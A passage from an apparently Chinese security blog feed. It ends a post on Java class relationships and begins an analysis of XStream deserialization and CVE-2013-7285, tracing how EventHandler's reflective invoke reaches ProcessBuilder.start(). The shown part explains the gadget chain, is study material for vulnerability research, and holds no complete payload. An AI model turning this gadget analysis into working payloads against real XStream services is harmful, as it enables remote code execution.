class="headerlink" title="聚合"></a>聚合</h3><p>聚合关系表示的是整体和部分的关系，整体与部分可以分开。聚合关系是关联关系的特例，具有关联的导航性与多重性。</p><p>如：一台电脑由键盘、显示器、鼠标等组成，组成电脑的各个配件是可以从电脑上分离出的，使用带空心菱形的实线来表示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Computer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Mouse</span> mouse<span class="token punctuation">;</span> <span class="token comment">//鼠标可以和Computer分离  </span>    <span class="token keyword">private</span> <span class="token class-name">Moniter</span> moniter<span class="token punctuation">;</span><span class="token comment">//显示器可以和Computer分离  </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMouse</span><span class="token punctuation">(</span><span class="token class-name">Mouse</span> mouse<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mouse <span class="token operator">=</span> mouse<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMoniter</span><span class="token punctuation">(</span><span class="token class-name">Moniter</span> moniter<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>moniter <span class="token operator">=</span> moniter<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>组合关系，也是整体与部分的关系，但是整体与部分不可以分开。</p><p>在程序中我们定义实体：Person与IDCard、Head，那么Head和Person就是组合，IDCard和Person就是聚合。</p><p>但是如果在程序中Person实体定义了对IDCard进行级联删除，即删除Person时连同IDCard一起删除，那么IDCard和Person就是组合了。</p><img src="/2023/04/20/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%85%AD%E5%A4%A7%E5%85%B3%E7%B3%BB/combination.png" class=""><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">IDCard</span> card<span class="token punctuation">;</span> <span class="token comment">//聚合关系    </span><span class="token keyword">private</span> <span class="token class-name">Head</span> head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Head</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//组合关系</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>依赖关系：类中用到了对方</li><li>泛化关系：继承关系</li><li>实现关系：A类实现B类的接口</li><li>关联关系：类与类之间的关系，双向关系或单向关系</li><li>聚合关系：整体和部分的关系</li><li>组合关系：整体与部分的关系</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Java 设计模式之六大关系&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java 反序列化之 XStream 反序列化-01</title>
    <link href="https://drun1baby.github.io/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/"/>
    <id>https://drun1baby.github.io/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</id>
    <published>2023-04-18T14:01:03.000Z</published>
    <updated>2023-06-22T10:15:21.190Z</updated>
    
    <content type="html"><![CDATA[<p>主要是了解一下 XStream 的运行流程，分析 CVE-2013-7285</p><span id="more"></span><h1 id="Java-反序列化之-XStream-反序列化（一）"><a href="#Java-反序列化之-XStream-反序列化（一）" class="headerlink" title="Java 反序列化之 XStream 反序列化（一）"></a>Java 反序列化之 XStream 反序列化（一）</h1><h2 id="0x01-XStream-基础"><a href="#0x01-XStream-基础" class="headerlink" title="0x01 XStream 基础"></a>0x01 XStream 基础</h2><h3 id="XStream-简介"><a href="#XStream-简介" class="headerlink" title="XStream 简介"></a>XStream 简介</h3><p>XStream 是一个简单的基于 Java 库，Java 对象序列化到 XML，反之亦然(即：可以轻易的将 Java 对象和 XML 文档相互转换)。</p><h3 id="使用-XStream-实现序列化与反序列化"><a href="#使用-XStream-实现序列化与反序列化" class="headerlink" title="使用 XStream 实现序列化与反序列化"></a>使用 XStream 实现序列化与反序列化</h3><p>下面看下如何使用 XStream 进行序列化和反序列化操作的。</p><p>先定义接口类</p><p><strong>IPerson.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IPerson</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接着定义 Person 类实现前面的接口：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">IPerson</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">int</span> age<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">", age "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XStream 序列化是调用 <code>XStream.toXML()</code> 来实现的：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Serialize</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Drunkbaby"</span><span class="token punctuation">;</span>          <span class="token class-name">XStream</span> xstream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> xml <span class="token operator">=</span> xstream<span class="token punctuation">.</span><span class="token function">toXML</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/serialize.png" class=""><p>XStream 反序列化是用过调用 <code>XStream.fromXML()</code> 来实现的，其中获取 XML 文件内容的方式可以通过 <code>Scanner()</code> 或 <code>FileInputStream</code> 都可以：</p><p><strong>Deserialize.java</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span></span><span class="token class-name">XStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>io<span class="token punctuation">.</span>xml<span class="token punctuation">.</span></span><span class="token class-name">DomDriver</span></span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Deserialize</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//        String xml = new Scanner(new File("person.xml")).useDelimiter("\\Z").next();  </span>        <span class="token class-name">FileInputStream</span> xml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"G:\\OneDrive - yapuu\\Java安全学习\\JavaSecurityLearning\\JavaSecurity\\XStream\\XStream\\XStream-Basic\\src\\main\\java\\person.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">XStream</span> xstream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> xstream<span class="token punctuation">.</span><span class="token function">fromXML</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>          p<span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Deserialize.png" class=""><h3 id="XStream-几个部分"><a href="#XStream-几个部分" class="headerlink" title="XStream 几个部分"></a>XStream 几个部分</h3><p>XStream 类图，参考<a class="link"   href="https://www.jianshu.com/p/387c568faf62" >XStream 源码解析<i class="fas fa-external-link-alt"></i></a>：</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/XStreamDiagram.png" class=""><p>主要分为四个部分：</p><h4 id="MarshallingStrategy-编码策略"><a href="#MarshallingStrategy-编码策略" class="headerlink" title="MarshallingStrategy 编码策略"></a>MarshallingStrategy 编码策略</h4><ul><li>marshall : object-&gt;xml 编码</li><li>unmarshall : xml-&gt; object 解码</li></ul><p>两个重要的实现类：</p><ul><li><code>com.thoughtworks.xstream.core.TreeMarshaller</code> : 树编组程序 </li><li>调用 Mapper 和 Converter 把 XML 转化成 Java 对象</li></ul><blockquote><p>其中的 start 方法开始编组</p></blockquote><p>其中调用了 <code>this.convertAnother(item)</code> 方法</p><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/start.png" class=""><blockquote><p>convertAnother 方法的作用是把 XML 转化成 Java 对象。</p></blockquote><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertAnother.png" class=""><h4 id="Mapper-映射器"><a href="#Mapper-映射器" class="headerlink" title="Mapper 映射器"></a>Mapper 映射器</h4><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Mapper.png" class=""><p>简单来说就是通过 mapper 获取对象对应的类、成员、Field 属性的 Class 对象，赋值给 XML 的标签字段。</p><h4 id="Converter-转换器"><a href="#Converter-转换器" class="headerlink" title="Converter 转换器"></a>Converter 转换器</h4><p>XStream 为 Java 常见的类型提供了 Converter 转换器。转换器注册中心是 XStream 组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为 XML 或将 XML 转换为对象。</p><p>简单地说，就是输入 XML 后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现 3 个方法，这三个方法分别是来自于 <code>Converter</code> 类以及它的父类 <code>ConverterMatcher</code></p><ul><li>canConvert 方法：告诉 XStream 对象，它能够转换的对象；</li><li>marshal 方法：能够将对象转换为 XML 时候的具体操作；</li><li>unmarshal 方法：能够将 XML 转换为对象时的具体操作；</li></ul><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ConverterMatcher.png" class=""><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Converter.png" class=""><p>具体参考：<a class="link"   href="http://x-stream.github.io/converters.html" >http://x-stream.github.io/converters.html<i class="fas fa-external-link-alt"></i></a></p><p>这里告诉了我们针对各种对象，XStream 都做了哪些支持。</p><h4 id="EventHandler-类"><a href="#EventHandler-类" class="headerlink" title="EventHandler 类"></a>EventHandler 类</h4><p>EventHandler 类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p><p>EventHandler 类是实现了 InvocationHandler 的一个类，设计本意是为交互工具提供 beans，建立从用户界面到应用程序逻辑的连接。</p><p>EventHandler 类定义的代码如下，其含有 target 和 action 属性，在 <code>EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()</code> 的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EventHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token class-name">Object</span> target<span class="token punctuation">;</span>      <span class="token keyword">private</span> <span class="token class-name">String</span> action<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arguments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token keyword">return</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arguments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>                               target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> action<span class="token punctuation">,</span> argTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                  <span class="token keyword">return</span> <span class="token class-name">MethodUtil</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>targetMethod<span class="token punctuation">,</span> target<span class="token punctuation">,</span> newArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里重点看下 <code>EventHandler.invokeInternal()</code> 函数的代码逻辑，如注释：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token class-name">Method</span> var2<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//-------------------------------------part1----------------------------------  </span><span class="token comment">//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称  </span>        <span class="token class-name">String</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">return</span> var1 <span class="token operator">==</span> var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">TRUE</span> <span class="token operator">:</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'@'</span> <span class="token operator">+</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>  <span class="token comment">//-------------------------------------part2----------------------------------  </span><span class="token comment">//貌似获取了一个class和object  </span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listenerMethodName <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>listenerMethodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>              <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>              <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>eventPropertyName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token class-name">Object</span> var7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">applyGetters</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEventPropertyName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var7<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>                  var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>var7 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> var7<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>  <span class="token comment">//------------------------------------------------------------------------------  </span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">int</span> var12 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>var12 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">applyGetters</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> var12<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">this</span><span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>var12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>  <span class="token comment">//--------------------------------------part3----------------------------------------  </span><span class="token comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException  </span>                <span class="token class-name">Method</span> var13 <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//--------------------------------------------------------------------------  </span><span class="token comment">//判断var13是否为空,当然不为空啦  </span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>var13 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      var13 <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"set"</span> <span class="token operator">+</span> <span class="token class-name">NameGenerator</span><span class="token punctuation">.</span><span class="token function">capitalize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>action<span class="token punctuation">)</span><span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>var13 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      <span class="token class-name">String</span> var9 <span class="token operator">=</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">" with no arguments"</span> <span class="token operator">:</span> <span class="token string">" with argument "</span> <span class="token operator">+</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"No method called "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>action <span class="token operator">+</span> <span class="token string">" on "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span 